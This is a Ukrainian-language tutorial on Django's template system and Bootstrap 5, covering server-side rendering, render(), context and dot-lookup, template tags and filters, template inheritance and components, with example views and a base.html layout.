# Django Template Architecture + Bootstrap 5

> Django Template System — презентаційний шар MVT.
> Тут Python-об'єкти "вмирають" і перетворюються на чистий HTML-рядок.
> Браузер ніколи не бачить Django-теги — тільки фінальний HTML.

---

## Введення: Що таке Server-Side Rendering і чому це важливо

### SSR як друкарський верстат

**Ментальна модель:** SSR — це як ДРУКАРСЬКИЙ ВЕРСТАТ. Django — це верстат: він отримує шаблон (форму для друку) та дані (чорнило), і виробляє готовий документ (HTML). Браузер — це ЧИТАЧ: він бачить лише надрукований документ, ніколи не бачить ні форму, ні чорнило.

**Ключова ідея:** Коли браузер отримує сторінку — Python вже не існує. Django ЗАВЕРШИВ роботу. HTML є статичним. Не можна "повернутись" до Python з браузера — є тільки HTML-рядок.

**Контраст із SPA (React/Vue):** У SPA браузер отримує ПОРОЖНІЙ HTML + JavaScript, і JavaScript будує сторінку. З SSR (Django) браузер отримує ПОВНИЙ HTML одразу.

**Чому SSR важливий для SEO:** Сканер Google читає HTML напряму. Повний HTML від Django = одразу індексується. SPA з порожнім HTML = Google нічого не бачить.

```
SSR vs SPA Timeline:

SSR (Django):
  Request → Server generates FULL HTML → Browser renders → User sees page
  [===== server work =====][= browser render =][USER SEES PAGE]

SPA (React):
  Request → Empty HTML → JS downloads → JS executes → JS fetches data → Renders
  [===][=== JS load ===][=== JS work ===][=== data fetch ===][USER SEES PAGE]
  
SSR wins on: First Contentful Paint, SEO, no-JS environments
SPA wins on: interactivity, subsequent navigation speed
```

**SSR перемагає:** First Contentful Paint (FCP), SEO, середовища без JavaScript, менший час до першого байту (TTFB).
**SPA перемагає:** інтерактивність після завантаження, швидкість подальшої навігації між сторінками.

---

---
- **🧠 Ментальна модель:** Повний цикл SSR — це конвеєр на заводі: кожна ланка виконує свою чітку роботу і передає результат далі. URL Dispatcher — це сортувальник, View — це майстер-виробник, Template Engine — це складальна лінія, Browser — це кінцевий споживач.
- **📚 Чому це існує:** Django розділяє обробку запиту на ізольовані шари (urls → view → template → response), щоб кожен шар можна було розуміти, тестувати і змінювати незалежно.
- **🌐 Що відбувається під капотом:** Nginx/Gunicorn приймає TCP-з'єднання та передає WSGI-об'єкт у Django. Django проходить через middleware, знаходить view, виконує ORM-запит до PostgreSQL, рендерить шаблон у пам'яті та повертає HTTP-відповідь. Весь цей процес відбувається за мілісекунди.
- **❌ Типова помилка початківця:** Думати, що "Django відправляє шаблон браузеру". Ні — Django відправляє вже готовий HTML. Браузер ніколи не бачить `{{ note.title }}` — він бачить `<h1>Назва нотатки</h1>`.
---

## 0. Server-Side Rendering — Повний Life Cycle

### Від HTTP-запиту до пікселів на екрані

Ця діаграма показує ПОВНИЙ шлях одного HTTP-запиту від браузера до пікселів на екрані. Зверни увагу де закінчується Python і починається HTML — це архітектурна межа SSR.

```
Browser (Клієнт)
    │
    │  1. HTTP GET /notes/42/
    │     Headers: Host, Cookie, Accept-Language
    ▼
Nginx / Gunicorn (веб-сервер)
    │
    │  2. WSGI/ASGI → Django Application
    ▼
urls.py  (URL Dispatcher)
    │  Парсинг URL: /notes/42/ → id=42
    │  Пошук зверху вниз, перший збіг
    ▼
View (Python функція/клас)
    │
    │  3. request.method, request.GET, request.user
    │  4. ORM: Note.objects.get(id=42)
    │       → SQL: SELECT * FROM hello_app_note WHERE id=42
    │       → Рядок БД → Python-об'єкт Note
    │  5. context = {'note': note, 'user': request.user}
    ▼
Template Engine
    │  6. Завантажити hello_app/note_detail.html з диску
    │  7. Скомпілювати: HTML-рядок → дерево Node-об'єктів
    │  8. Рендерити: замінити {{ note.title }} на реальні дані
    │     Виконати {% if %} / {% for %}
    │     Застосувати {% extends %} / {% block %}
    │     → Фінальний HTML-рядок
    ▼
HttpResponse(html_string, content_type='text/html; charset=utf-8')
    │  Status: 200 OK
    │  Headers: Content-Type, Set-Cookie
    │  Body: <html>...</html>
    ▼
TCP Stream → Browser
    │
    │  9.  Парсинг HTML → DOM Tree
    │  10. Парсинг CSS → CSSOM Tree
    │  11. DOM + CSSOM → Render Tree
    │  12. Layout (Flexbox/Grid математика)
    │  13. Paint → Пікселі на екрані
    ▼
Користувач бачить сторінку нотатки
```

### Архітектурна межа — де Python "вмирає"

Ця таблиця чітко показує ТРИ зони: Python View (ліворуч), Template Engine як місце перетворення (по центру), і те що браузер реально отримує (праворуч). Після `render()` Python-об'єктів більше не існує — є тільки рядки HTML.

```
View (Python)          Template Engine        Browser
──────────────         ───────────────        ──────────
note = Note(...)  →   {{ note.title }}  →   <h1>Назва</h1>
queryset = [...]  →   {% for n in notes%}→   <li>...</li>
user.is_staff     →   {% if user.staff%} →   (умовний HTML)

                       ↑ ТУТ МЕЖА ↑
Python-об'єкти    →    чистий HTML-рядок
зникають після         відправляється
render()               у браузер
```

---

---
- **🧠 Ментальна модель:** `render()` — це як функція `print()` для веб-сторінок. Але замість виводу в консоль, вона "друкує" HTML-документ і відправляє його браузеру. Context — це аргументи, які ти передаєш до цього "друку".
- **📚 Чому це існує:** Без `render()` тобі довелося б вручну знаходити шаблон, читати файл, підставляти рядки, загортати в HttpResponse. `render()` — це зручна обгортка (shortcut) для чотирьох операцій одночасно.
- **🌐 Що відбувається під капотом:** Django шукає шаблон у папках `templates/` кожного встановленого додатку (якщо `APP_DIRS=True`), компілює його у внутрішнє дерево Node-об'єктів (один раз, потім кешується), виконує рендеринг — обхід дерева з підстановкою даних з context — і повертає готовий HTML-рядок, загорнутий в `HttpResponse`.
- **❌ Типова помилка початківця:** Забути передати змінну в context і дивуватись чому шаблон показує порожнє місце. `render()` передає ТІЛЬКИ те, що ти явно поклав у словник context — нічого автоматично (крім `request` і змінних через context processors).
---

## 1. Анатомія функції `render()`

Цей код показує типову структуру view-функції. Зверни увагу на три ключові речі: як ORM-запит перетворює рядок БД на Python-об'єкт, як context-словник є "мостом" між Python та HTML, і як `render()` приймає всі ці дані для генерації відповіді.

```python
from django.shortcuts import render

def note_detail(request, pk):
    note = Note.objects.get(pk=pk)  # ORM → Python-об'єкт

    context = {                      # словник: ключ → шаблонна змінна
        'note': note,
        'page_title': 'Деталі нотатки',
        'is_owner': note.user == request.user,
    }

    return render(
        request,              # HttpRequest — middleware, cookies, user
        'hello_app/note_detail.html',  # шлях до шаблону (APP_DIRS=True → шукає в templates/)
        context               # словник що стає контекстом шаблону
    )
```

**Що відбувається з context після render():** Всі Python-об'єкти ЗНИКАЮТЬ. Браузер отримує тільки результуючий HTML. Це означає: не можна "повернутись" до Python-об'єкту з браузера. Кожен новий запит — нова view-функція, новий context, новий рендеринг.

### Що робить `render()` всередині

Цей розгорнутий код показує ЧИМ насправді є `render()` — це не магія, а чотири послідовні операції. Розуміючи ці чотири кроки, ти розумієш весь механізм SSR в Django.

```python
# render() — це скорочення для:
from django.template.loader import get_template
from django.http import HttpResponse

def render(request, template_name, context=None):
    # 1. Знайти шаблон
    template = get_template(template_name)   # ← читає файл з диску (або кешу)

    # 2. Скомпілювати (один раз, потім кешується)
    # HTML-рядок → дерево Node-об'єктів у пам'яті

    # 3. Рендерити — "злити" context із шаблоном
    html = template.render(context, request)

    # 4. Огорнути в HTTP-відповідь
    return HttpResponse(html, content_type='text/html; charset=utf-8')
```

---

---
- **🧠 Ментальна модель:** Context — це як "область видимості змінних" всередині шаблону. Уяви що ти входиш у нову кімнату (шаблон): все що ти взяв з собою (context) — доступне. Все що залишилось надворі (Python) — недоступне.
- **📚 Чому це існує:** Context забезпечує явну передачу даних між шарами MVT. Замість "магічних глобальних змінних", кожен шаблон отримує тільки те, що йому явно передали. Це робить код передбачуваним і легким для тестування.
- **🌐 Що відбувається під капотом:** Dot-lookup — це алгоритм: Django намагається 4 різні способи доступу до даних у визначеному порядку. Він зупиняється на першому успішному. Якщо жоден не спрацював — повертає `''` (порожній рядок). Жодного виключення не кидається.
- **❌ Типова помилка початківця:** Писати `{{ note.titel }}` замість `{{ note.title }}` і годинами шукати баг, бо шаблон тихо показує порожнє місце. Fail Silently — навмисна поведінка Django для продакшину, але ускладнює дебаг у розробці. Завжди використовуй Django Debug Toolbar для перевірки context.
---

## 2. Context і Dot-Lookup System

### Передача даних із View у шаблон

Цей код демонструє різні типи даних, які можна передати в context: QuerySet, int, string, bool та вкладений dict. Зверни увагу: ключі словника стають НАЗВАМИ ЗМІННИХ у шаблоні — `'notes'` стає `{{ notes }}`, `'total'` стає `{{ total }}`.

```python
# views.py
def note_list(request):
    notes = Note.objects.all().order_by('-created_at')
    context = {
        'notes': notes,             # QuerySet
        'total': notes.count(),     # int
        'user_name': request.user.username,  # string
        'is_staff': request.user.is_staff,   # bool
        'settings': {               # вкладений dict
            'per_page': 10,
            'show_dates': True,
        },
    }
    return render(request, 'hello_app/note_list.html', context)
```

### Dot-Lookup — порядок пошуку

Dot-lookup — це "розумний аксесор" Django: `{{ note.title }}` не є простим доступом до атрибута. Django пробує чотири різних підходи автоматично, що дозволяє використовувати однаковий синтаксис для словників, об'єктів, методів і списків.

Коли шаблон зустрічає `{{ foo.bar }}` — Django намагається по черзі:

```
1. Пошук за ключем словника:   foo['bar']
2. Пошук за атрибутом об'єкта: foo.bar
3. Виклик без аргументів:      foo.bar()
4. Пошук за індексом:          foo[bar]
```

Ці приклади показують dot-lookup у дії на різних типах даних. `{{ notes.0.title }}` — це три рівні dot-lookup: індекс → ORM-об'єкт → атрибут CharField. `{{ notes.count }}` викликає метод `.count()` без дужок — Django робить це автоматично (крок 3 алгоритму).

```html
{# notes — QuerySet (list-like) #}
{{ notes.0.title }}           {# → перша нотатка, поле title #}
{{ notes.count }}             {# → метод count() без () у шаблоні #}

{# note — Model instance #}
{{ note.title }}              {# → атрибут (CharField) #}
{{ note.created_at.year }}    {# → атрибут datetime → .year #}
{{ note.user.username }}      {# → ForeignKey → атрибут #}

{# settings — вкладений dict #}
{{ settings.per_page }}       {# → dict['per_page'] = 10 #}

{# request — HttpRequest об'єкт #}
{{ request.user.is_staff }}   {# → object.attr.attr #}
{{ request.GET.q }}           {# → dict-like: request.GET['q'] #}
```

### Fail Silently — тихе ігнорування помилок

**НЕБЕЗПЕКА тихого ігнорування:** `{{ note.titel }}` (помилка у назві) показує нічого і не дає ЖОДНОЇ помилки. Це навмисне дизайн-рішення (уникнути краш продакшину через опечатку), але означає, що для діагностики потрібен Debug Toolbar. Ніколи не довіряй "пустому місцю" в шаблоні — завжди перевіряй context через DjDT.

```html
{# Змінної 'missing_var' немає в context #}
<p>{{ missing_var }}</p>
{# → браузер побачить: <p></p> — порожній рядок, НЕ помилку #}

{# Небезпека: опечатка у назві змінної → порожня сторінка без помилки #}
{{ note.titel }}  {# 'titel' замість 'title' → тихо порожньо #}
```

> **Дебагінг:** якщо змінна не відображається — відкрий Django Debug Toolbar
> → Templates Panel → Toggle context. Побачиш точний словник що отримав шаблон.

---

---
- **🧠 Ментальна модель:** DTL (Django Template Language) — це навмисно СПРОЩЕНА мова. Уяви Python, з якого прибрали все небезпечне: немає довільного виконання коду, немає import, немає виклику методів з аргументами. DTL схожий на мову заповнення форм, а не мову програмування.
- **📚 Чому це існує:** Поділ відповідальності (Separation of Concerns) — принцип MVT. Шаблони відповідають за ПРЕЗЕНТАЦІЮ. Бізнес-логіка має бути у view або model. DTL навмисно обмежений, щоб унеможливити "витікання" логіки у шаблон.
- **🌐 Що відбувається під капотом:** DTL компілює шаблон у Python-об'єкти (NodeList) один раз при першому запиті, а потім кешує результат. Повторні запити використовують кешований скомпільований шаблон — це набагато швидше повторного парсингу файлу.
- **❌ Типова помилка початківця:** Намагатися викликати Python-методи з аргументами: `{{ form.fields.get('title') }}` — не працює! DTL не дозволяє передавати аргументи при виклику методів. Якщо потрібна складна логіка — роби це у view і передавай готовий результат.
---

## 3. DTL Синтаксис — повна довідка

### Два типи синтаксису DTL

Перш ніж читати далі — запам'ятай фундаментальне розрізнення між двома конструкціями DTL:

```
{{ }} = ВИВЕСТИ значення (як print() у Python)
{% %} = ВИКОНАТИ тег (як if/for/with у Python)
```

**Ментальна модель:**
- `{{ }}` — це дірка в шаблоні, куди вставляється значення. 
- `{% %}` — це команда, яка щось робить (перевіряє умову, створює цикл, завантажує теги). 
- Браузер ніколи не бачить ні `{{ }}`, ні `{% %}` — тільки результат їхньої роботи.

**Чому не можна викликати `{{ note.delete() }}`:** DTL запобігає виконанню небезпечних операцій з шаблонів. Це FEATURE, а не обмеження. Уяви якби будь-хто міг видалити дані з БД, просто передавши `?template=delete_all` у URL. DTL робить такі атаки неможливими за замовчуванням.

### Змінні `{{ }}`

`{{ }}` — основний спосіб відображення даних. Зверни на фільтри — вони застосовуються через `|` і дозволяють форматувати дані прямо в шаблоні. Ланцюжок фільтрів `|truncatewords:30|lower` виконується ліворуч праворуч.

```html
{{ note.title }}                         {# рядок #}
{{ note.created_at|date:"d.m.Y H:i" }}  {# з фільтром #}
{{ notes|length }}                       {# довжина QuerySet #}
{{ note.content|truncatewords:30|lower }} {# ланцюжок фільтрів #}
```

### Теги `{% %}` — логіка

Блок `{% if %}` в Django підтримує всі стандартні порівняння Python. Оператори `and`, `or`, `not` — такі ж, як у Python. Але пам'ятай: складна умовна логіка в шаблоні — ознака того, що логіку треба перенести у view.

```html
{# if / elif / else #}
{% if user.is_authenticated %}
    <span>Привіт, {{ user.username }}!</span>
{% elif user.is_staff %}
    <span>Staff користувач</span>
{% else %}
    <a href="{% url 'login' %}">Увійти</a>
{% endif %}

{# Оператори: ==, !=, <, >, <=, >=, in, not in, is, is not #}
{% if notes|length > 0 and user.is_active %}
{% if status == "published" or status == "draft" %}
{% if not note.is_deleted %}
```

Цикл `{% for %}` з тегом `{% empty %}`. **ЗАВЖДИ використовуй `{% empty %}`** для QuerySets! Без нього порожній список рендерить нічого — користувач бачить чисту сторінку без пояснень. З `{% empty %}` ти явно показуєш "нічого немає" замість "щось зламалось".

`forloop.counter` vs `forloop.counter0`: використовуй `counter` для людино-читаних номерів (1, 2, 3...), `counter0` для CSS-класів або індексів масивів (0, 1, 2...). `forloop.first` і `forloop.last` дозволяють стилізувати перший/останній елемент без JavaScript.

```html
{# for / empty #}
{% for note in notes %}
    <div class="card">{{ note.title }}</div>
{% empty %}
    <p>Нотаток немає.</p>   {# якщо QuerySet порожній #}
{% endfor %}

{# Змінні циклу #}
{% for note in notes %}
    {{ forloop.counter }}     {# 1, 2, 3... (починаючи з 1) #}
    {{ forloop.counter0 }}    {# 0, 1, 2... (починаючи з 0) #}
    {{ forloop.revcounter }}  {# зворотній: N, N-1... #}
    {{ forloop.first }}       {# True якщо перший елемент #}
    {{ forloop.last }}        {# True якщо останній елемент #}
    {{ forloop.parentloop }}  {# доступ до зовнішнього циклу #}

    {# Умовні класи на основі циклу #}
    <div class="card {% if forloop.first %}border-primary{% endif %}">
        {{ note.title }}
    </div>
{% endfor %}
```

`{% url %}` — безпечна генерація URL за ім'ям маршруту. Ніколи не хардкодь URL у шаблонах! Якщо ти змінюєш URL-маршрут у `urls.py`, `{% url %}` оновлюється автоматично скрізь. Хардкодений `/notes/42/` залишиться зламаним у сотні місцях.

```html
{# url — безпечна генерація URL по імені #}
<a href="{% url 'hello_app:note_list' %}">Всі нотатки</a>
<a href="{% url 'hello_app:note_detail' pk=note.pk %}">{{ note.title }}</a>
<form action="{% url 'hello_app:note_delete' pk=note.pk %}" method="post">
```

**CSRF-захист — детальне пояснення:**

Атака CSRF (Cross-Site Request Forgery) — одна з найпоширеніших веб-атак. Ось як вона працює і як `{% csrf_token %}` захищає:

```
CSRF Attack (без захисту):
  1. Користувач входить на bank.com → отримує session cookie
  2. Користувач відвідує evil.com
  3. evil.com непомітно надсилає POST на bank.com/transfer/ з session cookie
  4. Bank.com думає: "це справжній користувач!" → виконує переказ!

CSRF Token Defense (з {% csrf_token %}):
  1. Django генерує випадковий токен при рендерингу форми
  2. Токен вставляється у HTML форму як приховане поле
  3. Токен також зберігається у браузерному cookie
  4. При POST Django перевіряє: токен у формі == токен у cookie?
  5. evil.com не може прочитати токен з іншого домену (Same-Origin Policy)
  6. POST від evil.com не містить правильного токена → 403 Forbidden!

{% csrf_token %} генерує:
<input type="hidden" name="csrfmiddlewaretoken" value="abc123xyz...">
```

Тег `{% csrf_token %}` є ОБОВ'ЯЗКОВИМ у всіх POST-формах. Без нього Django поверне `403 Forbidden`. Це не баг Django — це захист від реальних атак.

```html
{# csrf_token — обов'язковий у POST-формах #}
<form method="post">
    {% csrf_token %}
    ...
</form>

{# comment — не потрапляє в HTML #}
{# Це коментар — браузер його не побачить #}
{% comment %}
    Багаторядковий коментар
    з кількох рядків
{% endcomment %}

{# with — скоротити довгий вираз або зберегти результат #}
{% with full_name=user.first_name|add:" "|add:user.last_name %}
    <span>{{ full_name }}</span>
{% endwith %}
```

### Фільтри `{{ var|filter }}`

Фільтри — це функції перетворення даних прямо у шаблоні. Синтаксис `{{ value|filter:argument }}`. Можна ланцюжити: `{{ value|filter1|filter2 }}`. Але пам'ятай: складна обробка даних має бути у view, а не у ланцюжку фільтрів.

```html
{# Текст #}
{{ note.title|lower }}           {# нижній регістр #}
{{ note.title|upper }}           {# ВЕРХНІЙ РЕГІСТР #}
{{ note.title|capfirst }}        {# Перша велика #}
{{ note.title|title }}           {# Кожне Слово З Великої #}
{{ note.content|truncatewords:30 }} {# обрізати до 30 слів #}
{{ note.content|truncatechars:100 }} {# обрізати до 100 символів #}
{{ note.content|wordcount }}     {# кількість слів #}
{{ note.content|linebreaks }}    {# \n → <br> → <p> #}
{{ note.content|linebreaksbr }}  {# \n → <br> (тільки br) #}
{{ note.content|striptags }}     {# видалити всі HTML-теги #}

{# Числа #}
{{ price|floatformat:2 }}        {# 1500.00 #}
{{ count|filesizeformat }}       {# 1.5 MB #}

{# Дата і час #}
{{ note.created_at|date:"d.m.Y" }}       {# 21.05.2026 #}
{{ note.created_at|date:"d F Y" }}       {# 21 травня 2026 #}
{{ note.created_at|time:"H:i" }}         {# 14:30 #}
{{ note.created_at|timesince }}          {# "3 дні тому" #}
{{ note.created_at|timeuntil }}          {# "за 2 дні" #}

{# Списки і QuerySets #}
{{ notes|length }}               {# кількість елементів #}
{{ notes|first }}                {# перший елемент #}
{{ notes|last }}                 {# останній елемент #}
{{ tags|join:", " }}             {# з'єднати список через ", " #}
{{ notes|slice:":3" }}           {# перші 3 елементи #}

{# Безпека #}
{{ user_input|escape }}          {# HTML-екранування (за замовчуванням) #}
{{ trusted_html|safe }}          {# вимкнути екранування (обережно!) #}
{{ html_content|striptags }}     {# видалити HTML-теги #}
{{ value|default:"Не вказано" }} {# значення якщо None або '' #}
{{ value|default_if_none:"—" }}  {# тільки якщо None #}

{# URL та зображення #}
{{ url|urlencode }}              {# закодувати URL параметри #}
{{ text|slugify }}               {# "Hello World" → "hello-world" #}
```

---

---
- **🧠 Ментальна модель:** Template Inheritance — це як НАСЛІДУВАННЯ КЛАСІВ у Python. `base.html` — це батьківський клас з методами за замовчуванням. Дочірні шаблони `{% extends %}` "наслідують" базовий і "перевизначають" конкретні `{% block %}` методи. `{{ block.super }}` — це `super()` у Python.
- **📚 Чому це існує:** DRY (Don't Repeat Yourself). Без наслідування кожна сторінка повторювала б navbar, footer, підключення Bootstrap. Зміна одного рядка в navbar вимагала б редагування 50 файлів. З `base.html` — одне місце, один рядок.
- **🌐 Що відбувається під капотом:** При рендерингу дочірнього шаблону Django спочатку завантажує БАТЬКІВСЬКИЙ шаблон (рекурсивно, якщо є кілька рівнів наслідування), потім замінює `{% block %}` секції вмістом дочірнього шаблону, і лише після цього рендерить результат із context.
- **❌ Типова помилка початківця:** Ставити `{% extends 'base.html' %}` не першим рядком — або ставити текст перед ним. `{% extends %}` ПОВИНЕН бути першим тегом у файлі (допускаються лише коментарі перед ним). Будь-який текст чи HTML до `{% extends %}` спричинить помилку або буде проігнорований.
---

## 4. Template Inheritance — Система успадкування

**Чому не просто `{% include %}`?** `include` копіює файл у поточне місце — це для КОМПОНЕНТІВ (кнопки, картки, навбар-фрагменти). `extends` ЗАМІНЮЄ конкретні секції батьківського шаблону — це для СТРУКТУРИ сторінки. Їх відмінність принципова: `include` — "вставити шматок HTML сюди", `extends` — "ця сторінка є різновидом батьківської".

**Трирівнева ієрархія — продакшн-патерн:**
```
base.html → визначає HTML-оболонку, Bootstrap, Navbar, Footer
    ↓ extends
layouts/section.html → визначає структуру конкретного розділу
    ↓ extends
feature/page.html → тільки унікальний вміст сторінки
```

### Архітектура трьох рівнів

```
base.html              ← Глобальний каркас: <html>, Bootstrap, Navbar, Footer
    │
    ├── base_notes.html ← Секційний каркас: заголовок секції, breadcrumbs
    │       │
    │       ├── note_list.html    ← Список нотаток
    │       └── note_detail.html  ← Деталі нотатки
    │
    └── base_auth.html  ← Каркас авторизації: центрована форма
            │
            ├── login.html        ← Форма входу
            └── register.html     ← Форма реєстрації
```

### base.html — базовий каркас

**Покрокове читання `base.html`** — цей файл великий, але кожен блок вирішує конкретну задачу. Читай його як пошарову архітектуру:

```
base.html — анатомія пошарово:

┌──────────────────────────────────────────────────────┐
│ <head>                                               │
│   {% block title %} — назва вкладки браузера         │
│   {% block meta %} — SEO теги                        │
│   Bootstrap CDN CSS — базові стилі                   │
│   {% block extra_css %} — слот для CSS дочірніх      │
├──────────────────────────────────────────────────────┤
│ <body>                                               │
│   {% block navbar %} — навігація (sticky-top)        │
│   ─────────────────────────────────────────────────  │
│   {% if messages %} — Django messages (alerts)       │
│   ─────────────────────────────────────────────────  │
│   <main>                                             │
│     {% block breadcrumbs %} — шлях навігації         │
│     {% block page_header %} — заголовок сторінки     │
│     {% block content %} — ГОЛОВНИЙ СЛОТ              │
│   </main>                                            │
│   ─────────────────────────────────────────────────  │
│   <footer> — підвал                                  │
│   Bootstrap CDN JS — компоненти (modal, collapse...) │
│   {% block extra_js %} — слот для JS дочірніх       │
└──────────────────────────────────────────────────────┘
```

**Чому `class="d-flex flex-column min-vh-100"` на `<body>`:** Це класичний Bootstrap Flexbox трюк для "sticky footer". `min-vh-100` — мінімальна висота 100% вьюпорту. `flex-column` — вертикальний Flexbox. `flex-grow-1` на `<main>` — main займає весь вільний простір. Footer "прилипає" до низу навіть на коротких сторінках.

**Зверни на `sticky-top` у navbar:** Bootstrap клас `sticky-top` додає `position: sticky; top: 0` — navbar залишається видимим при скролінгу. Без нього navbar прокручується разом із сторінкою.

Цей файл — СЕРЦЕ твого проєкту. Зверни увагу на стратегію `{% block %}`: кожен `{% block %}` — це "слот" який дочірній шаблон може заповнити або замінити. Якщо дочірній шаблон не визначає `{% block %}` — використовується вміст батьківського блоку (або порожньо, якщо батьківський блок теж порожній). Зверни особливо на `{% block extra_css %}` і `{% block extra_js %}` — вони дозволяють кожній сторінці підключати свої стилі та скрипти без зміни base.html.

```html
{% load static %}
<!DOCTYPE html>
<html lang="uk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    {# TITLE: дочірній шаблон може перевизначити #}
    <title>{% block title %}Нотатки{% endblock %} | MySite</title>

    {# Meta tags: дочірній може додати специфічні #}
    {% block meta %}
    <meta name="description" content="Система нотаток на Django">
    {% endblock %}

    <!-- Bootstrap CSS -->
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css"
          rel="stylesheet">

    {# CSS: дочірній може додати свої стилі #}
    {% block extra_css %}{% endblock %}
</head>
<body class="d-flex flex-column min-vh-100">

    {# NAVBAR: можна перевизначити в дочірньому #}
    {% block navbar %}
    <nav class="navbar navbar-expand-lg navbar-dark bg-dark sticky-top">
        <div class="container">
            <a class="navbar-brand" href="{% url 'hello_app:index' %}">📝 Нотатки</a>
            <button class="navbar-toggler" type="button"
                    data-bs-toggle="collapse" data-bs-target="#navMenu">
                <span class="navbar-toggler-icon"></span>
            </button>
            <div class="collapse navbar-collapse" id="navMenu">
                <ul class="navbar-nav me-auto">
                    <li class="nav-item">
                        <a class="nav-link {% block nav_index %}{% endblock %}"
                           href="{% url 'hello_app:index' %}">Головна</a>
                    </li>
                    <li class="nav-item">
                        <a class="nav-link {% block nav_notes %}{% endblock %}"
                           href="{% url 'hello_app:note_list' %}">Нотатки</a>
                    </li>
                </ul>
            </div>
        </div>
    </nav>
    {% endblock %}

    {# MESSAGES: завжди відображаємо в base #}
    {% if messages %}
    <div class="container mt-3">
        {% for message in messages %}
        <div class="alert alert-{{ message.tags }} alert-dismissible fade show" role="alert">
            {{ message }}
            <button type="button" class="btn-close" data-bs-dismiss="alert"></button>
        </div>
        {% endfor %}
    </div>
    {% endif %}

    {# MAIN CONTENT: заповнює кожен дочірній шаблон #}
    <main class="container py-4 flex-grow-1">
        {# Breadcrumbs: дочірній може додати #}
        {% block breadcrumbs %}{% endblock %}

        {# Заголовок сторінки: дочірній може додати #}
        {% block page_header %}{% endblock %}

        {# Основний вміст #}
        {% block content %}{% endblock %}
    </main>

    <footer class="bg-dark text-light py-3 mt-auto">
        <div class="container text-center">
            <small>© 2026 | Django + Bootstrap 5</small>
        </div>
    </footer>

    <!-- Bootstrap JS -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>

    {# JS: дочірній може додати свої скрипти #}
    {% block extra_js %}{% endblock %}
</body>
</html>
```

### Дочірній шаблон

Це мінімальний дочірній шаблон — він заповнює тільки ті блоки, які потрібні. Всі незаповнені блоки (наприклад `{% block meta %}`) використовують вміст батьківського шаблону. Зверни що `{% block content %}` містить ТІЛЬКИ унікальний вміст цієї сторінки — весь каркас (navbar, footer, Bootstrap CSS) вже є в base.html.

```html
{% extends 'hello_app/base.html' %}  {# ЗАВЖДИ ПЕРШИМ РЯДКОМ #}

{% block title %}Мої нотатки{% endblock %}

{% block nav_notes %}active{% endblock %}  {# активний пункт меню #}

{% block breadcrumbs %}
<nav aria-label="breadcrumb" class="mb-3">
    <ol class="breadcrumb">
        <li class="breadcrumb-item"><a href="{% url 'hello_app:index' %}">Головна</a></li>
        <li class="breadcrumb-item active">Нотатки</li>
    </ol>
</nav>
{% endblock %}

{% block page_header %}
<div class="d-flex justify-content-between align-items-center mb-4">
    <h1 class="h3">Мої нотатки</h1>
    <a href="{% url 'hello_app:note_create' %}" class="btn btn-primary">+ Нова</a>
</div>
{% endblock %}

{% block content %}
{# ТІЛЬКИ УНІКАЛЬНИЙ ВМІСТ ЦІЄЇ СТОРІНКИ #}
<div class="row row-cols-1 row-cols-md-3 g-4">
    {% for note in notes %}
    <div class="col">
        <div class="card h-100">
            <div class="card-body">
                <h5 class="card-title">{{ note.title }}</h5>
                <p class="card-text text-muted">{{ note.content|truncatewords:15 }}</p>
            </div>
        </div>
    </div>
    {% endfor %}
</div>
{% endblock %}

{% block extra_js %}
{# JavaScript тільки для цієї сторінки #}
<script>
    console.log('note_list page loaded');
</script>
{% endblock %}
```

**Про `{{ block.super }}`:** Іноді ти хочеш не ЗАМІНИТИ вміст батьківського блоку, а ДОПОВНИТИ його. `{{ block.super }}` вставляє вміст батьківського блоку і дозволяє додати свій:

- **Без `{{ block.super }}`:** дочірній блок ПОВНІСТЮ ЗАМІНЮЄ батьківський.
- **З `{{ block.super }}`:** дочірній блок ДОПОВНЮЄ батьківський блок своїм вмістом.
- **Реальний кейс:** батько має `{% block extra_css %}{% endblock %}` — порожній. Дочірній додає CSS для цієї сторінки. Але якщо батько вже має якийсь CSS у блоці — `{{ block.super }}` збереже його і додасть новий.

Приклад: батько визначає базові скрипти в `{% block extra_js %}`, дочірня сторінка хоче додати свої скрипти НЕ видаляючи батьківські:
```html
{% block extra_js %}
{{ block.super }}  {# ← зберегти все що було в батьківському блоці #}
<script src="{% static 'hello_app/js/notes-specific.js' %}"></script>
{% endblock %}
```

### `{% include %}` — компоненти

`{% include %}` — для КОМПОНЕНТІВ (частини інтерфейсу що повторюються): картка нотатки, аватар користувача, пагінація. Ключова різниця: `include` не успадковує — він просто вставляє файл у поточне місце. Параметр `with` передає додаткові змінні. Параметр `only` ізолює контекст компонента.

```html
{# Багаторазові компоненти — окремі файли #}
{% include 'hello_app/components/note_card.html' %}

{# Передача додаткових змінних #}
{% include 'hello_app/components/note_card.html' with note=note show_footer=True %}

{# Ізольований контекст (тільки передані змінні, без основного context) #}
{% include 'hello_app/components/note_card.html' with note=note only %}
```

Це файл компонента — він отримує `note` і `show_footer` з параметрів `with`. Зверни на умовний `{% if show_footer %}` — компонент адаптується залежно від того, де він використовується.

```html
{# hello_app/components/note_card.html #}
<div class="card h-100 border-0 shadow-sm">
    <div class="card-body">
        <h5 class="card-title">
            <a href="{% url 'hello_app:note_detail' pk=note.pk %}"
               class="text-decoration-none text-dark">
                {{ note.title }}
            </a>
        </h5>
        <p class="card-text text-muted">{{ note.content|truncatewords:20 }}</p>
    </div>
    {% if show_footer %}
    <div class="card-footer bg-transparent border-0">
        <small class="text-muted">{{ note.created_at|date:"d.m.Y" }}</small>
    </div>
    {% endif %}
</div>
```

---

---
- **🧠 Ментальна модель:** Статичні файли (CSS, JS, зображення) — це ВАНТАЖ, який Django несе тільки в розробці. У продакшині Django передає цей вантаж Nginx — набагато сильнішому вантажнику. `{% load static %}` — це як "завантажити вилочний навантажувач" перед роботою з вантажем.
- **📚 Чому це існує:** `{% static 'path' %}` перетворює відносний шлях на абсолютний URL, враховуючи `STATIC_URL` з settings.py. Якщо ти переносиш статику на CDN (CloudFront, S3), змінюєш лише `STATIC_URL` — і ВСІ посилання у шаблонах оновлюються автоматично.
- **🌐 Що відбувається під капотом:** У розробці Django шукає статику в `static/` папках кожного додатку (якщо `DEBUG=True`). У продакшині `python manage.py collectstatic` збирає всі статичні файли в єдину папку `STATIC_ROOT`, звідки Nginx роздає їх напряму — без виклику Python взагалі.
